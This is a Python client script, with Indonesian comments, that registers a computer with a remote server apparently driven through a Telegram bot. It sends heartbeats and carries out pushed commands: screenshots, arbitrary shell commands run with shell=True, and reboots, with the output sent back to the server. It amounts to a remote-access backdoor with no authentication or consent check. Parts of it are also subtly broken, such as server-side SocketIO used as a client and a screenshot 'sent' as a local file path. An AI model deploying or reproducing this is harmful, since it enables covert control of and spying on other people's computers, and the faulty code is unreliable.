# client.py
import os
import sys
import json
import time
import uuid
import socket
import platform
import threading
import requests
import subprocess
import pyautogui
from PIL import Image
import io
from flask_socketio import SocketIO

# Konfigurasi - Ganti dengan URL Render Anda
SERVER_URL = "https://telegram-bot-server.onrender.com"  # Ganti dengan URL Render Anda
SERVER_PORT = 443  # Port HTTPS

# Generate unique client ID
CLIENT_ID = str(uuid.uuid4())
CLIENT_NAME = socket.gethostname()

# Inisialisasi SocketIO client
socketio = SocketIO()

def register_client():
    """Daftarkan client ke server"""
    try:
        response = requests.post(
            f"{SERVER_URL}/register",
            json={'client_id': CLIENT_ID, 'name': CLIENT_NAME},
            timeout=10
        )
        return response.status_code == 200
    except Exception as e:
        print(f"Error registering client: {e}")
        return False

def send_heartbeat():
    """Kirim heartbeat ke server"""
    try:
        response = requests.post(
            f"{SERVER_URL}/heartbeat",
            json={'client_id': CLIENT_ID},
            timeout=10
        )
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending heartbeat: {e}")
        return False

def execute_command(command, chat_id=None):
    """Eksekusi perintah dan kirim hasil ke server"""
    try:
        if command == 'screenshot':
            # Ambil screenshot
            screenshot = pyautogui.screenshot()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr.seek(0)
            
            # Simpan sementara
            filename = f"screenshot_{int(time.time())}.png"
            with open(filename, 'wb') as f:
                f.write(img_byte_arr.read())
            
            # Kirim ke server
            socketio.emit('command_result', {
                'client_id': CLIENT_ID,
                'result': {
                    'type': 'file',
                    'file_path': filename,
                    'caption': f"Screenshot dari {CLIENT_NAME}"
                },
                'chat_id': chat_id
            })
            
        elif command.startswith('cmd_'):
            # Eksekusi perintah sistem
            cmd = command[4:]  # Hapus prefix 'cmd_'
            
            if platform.system() == 'Windows':
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            else:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            output = result.stdout + result.stderr
            
            # Kirim hasil ke server
            socketio.emit('command_result', {
                'client_id': CLIENT_ID,
                'result': {
                    'type': 'text',
                    'data': f"Hasil perintah '{cmd}':\n{output}"
                },
                'chat_id': chat_id
            })
            
        elif command == 'reboot':
            # Reboot sistem
            if platform.system() == 'Windows':
                subprocess.run(["shutdown", "/r", "/t", "10"])
            else:
                subprocess.run(["reboot"])
            
            socketio.emit('command_result', {
                'client_id': CLIENT_ID,
                'result': {
                    'type': 'text',
                    'data': "Sistem akan reboot dalam 10 detik"
                },
                'chat_id': chat_id
            })
            
        else:
            # Perintah tidak dikenali
            socketio.emit('command_result', {
                'client_id': CLIENT_ID,
                'result': {
                    'type': 'text',
                    'data': f"Perintah tidak dikenali: {command}"
                },
                'chat_id': chat_id
            })
            
    except Exception as e:
        socketio.emit('command_result', {
            'client_id': CLIENT_ID,
            'result': {
                'type': 'text',
                'data': f"Error executing command: {str(e)}"
            },
            'chat_id': chat_id
        })

@socketio.on('connect')
def handle_connect():
    print("Connected to server")
    socketio.emit('register', {
        'client_id': CLIENT_ID,
        'name': CLIENT_NAME
    })

@socketio.on('execute_command')
def handle_execute_command(data):
    command = data.get('command')
    chat_id = data.get('chat_id')
    
    print(f"Executing command: {command}")
    execute_command(command, chat_id)

def heartbeat_thread():
    """Thread untuk mengirim heartbeat ke server"""
    while True:
        send_heartbeat()
        time.sleep(30)  # Kirim heartbeat setiap 30 detik

if __name__ == '__main__':
    # Daftarkan client ke server
    if not register_client():
        print("Failed to register client. Exiting...")
        sys.exit(1)
    
    # Start heartbeat thread
    hb_thread = threading.Thread(target=heartbeat_thread)
    hb_thread.daemon = True
    hb_thread.start()
    
    # Connect to server
    socketio.connect(f"{SERVER_URL}")
    
    # Keep the client running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Client shutting down...")
        socketio.disconnect()
